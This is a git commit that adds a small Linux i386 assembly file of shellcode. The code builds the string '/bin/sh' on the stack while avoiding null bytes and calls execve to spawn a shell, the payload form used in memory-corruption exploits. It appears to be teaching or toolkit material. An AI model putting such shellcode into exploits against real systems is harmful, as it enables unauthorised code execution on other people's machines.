bbe99ed0f33dcd933dbb0075bc48d2099d215e1c
NoNeedToBeUpset <noneedtobeupset@cock.li>
2014-06-04 05:44:46 +0200

    executes /bin/sh on linux

---
+++ linux-i386-sh.s
@@ -0,0 +1,15 @@
+	.text
+.globl _start
+_start:
+	movl	%esp, %ecx	# make some room on the stack
+	subb	$0x11, %ch
+	movl	%ecx, %esp
+
+	xorl	%ecx, %ecx
+	mull	%ecx		# %ecx = %eax = %edx = 0
+	addb	$11, %al	# %eax = __NR_execve
+	pushl	$0x0168732f	# Xhs/	(X to be nulled)
+	pushl	$0x6e69622f	# nib/
+	movl	%esp, %ebx	# arg 1 to exec is /bin/sh
+	subb	$1, 7(%esp)
+	int	$0x80		# sys_execve("/bin/sh", NULL, NULL)
